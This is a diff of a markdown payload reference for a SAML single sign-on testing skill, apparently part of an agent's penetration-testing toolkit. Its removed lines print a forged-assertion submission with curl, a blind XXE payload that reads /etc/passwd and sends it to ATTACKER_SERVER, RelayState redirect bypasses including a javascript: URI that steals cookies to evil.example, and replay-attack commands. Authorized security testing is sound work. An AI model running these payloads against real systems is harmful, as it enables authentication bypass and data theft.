@@ -1,5 +1,5 @@
 ---
-description: Unsigned assertion templates, XSW signature wrapping variants (1-8), NameID comment/encoding injection, attribute escalation, RelayState redirect, XXE via SAML
+description: Unsigned assertion template, XSW1/2/3/4/7 signature wrapping, NameID comment/encoding injection, attribute and condition manipulation, XXE via the response and fetched metadata, library-specific CVEs
 skill: saml-sso-testing
 ---
 
@@ -56,20 +56,6 @@ Replace `{SP_ACS_URL}`, `{SP_ENTITY_ID}`, `{TARGET_EMAIL}`, and `{IDP_ENTITY_ID}
     </saml:AttributeStatement>
   </saml:Assertion>
 </samlp:Response>
-```
-
-### Usage
-
-```bash
-# 1. Save the template as response.xml with target values filled in
-# 2. Base64-encode
-base64 -w0 response.xml > response_b64.txt
-# 3. URL-encode if needed (for form POST)
-# 4. Submit to ACS endpoint
-curl -X POST "{SP_ACS_URL}" \
-  -d "SAMLResponse=$(cat response_b64.txt)" \
-  -d "RelayState=/" \
-  -v
 ```
 
 ---
@@ -321,30 +307,8 @@ curl -X POST "{SP_ACS_URL}" \
 </samlp:Response>
 ```
 
-### OOB XXE (Blind)
-
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/xxe.dtd">
-  %xxe;
-]>
-<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
-  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
-    <saml:Subject>
-      <saml:NameID>test@target.example</saml:NameID>
-    </saml:Subject>
-  </saml:Assertion>
-</samlp:Response>
-```
-
-External DTD (`xxe.dtd`):
-```xml
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_SERVER/?data=%file;'>">
-%eval;
-%exfil;
-```
+Blind/OOB XXE uses the external-DTD shapes and the hosted-listener requirement in
+`agent/references/payloads/xxe-payloads.md` "Blind XXE — Out-of-Band (OOB)".
 
 ### XXE via SAML Metadata
 
@@ -366,58 +330,10 @@ If the SP fetches metadata from a URL you control:
 
 ---
 
-## RelayState Redirect Payloads
+## RelayState
 
-```
-# Basic external redirect
-RelayState=https://evil.example
-RelayState=//evil.example
-RelayState=https://target.example@evil.example
-RelayState=https://evil.example%23.target.example
-
-# Protocol-relative
-RelayState=//evil.example/steal-token
-RelayState=///evil.example
-
-# URL encoding bypass
-RelayState=https%3A%2F%2Fevil.example
-RelayState=%68%74%74%70%73%3A%2F%2Fevil.example
-
-# JavaScript (if RelayState used in script context)
-RelayState=javascript:document.location='https://evil.example/?c='+document.cookie
-
-# Data URI
-RelayState=data:text/html,<script>location='https://evil.example'</script>
-
-# Domain confusion
-RelayState=https://target.example.evil.example
-RelayState=https://evil-target.example
-RelayState=https://target.example%00.evil.example
-
-# Path traversal
-RelayState=/../../../evil-path
-RelayState=/..%252f..%252f
-```
-
----
-
-## Replay Attack Payloads
-
-```bash
-# Capture valid SAMLResponse, then replay:
-
-# 1. Same browser, same session (should fail - already consumed)
-curl -X POST "{SP_ACS_URL}" -d "SAMLResponse=$CAPTURED&RelayState=/"
-
-# 2. Different browser/session (should fail - InResponseTo mismatch)
-curl -X POST "{SP_ACS_URL}" -d "SAMLResponse=$CAPTURED&RelayState=/" -H "Cookie: new_session"
-
-# 3. After NotOnOrAfter (should fail - expired)
-# Wait for condition expiry, then replay
-
-# 4. Remove InResponseTo (may bypass replay detection)
-# Edit XML: remove InResponseTo attribute from SubjectConfirmationData
-```
+RelayState is an open-redirect input: use the bypass forms in
+`agent/references/payloads/open-redirect-payloads.md`.
 
 ---
 
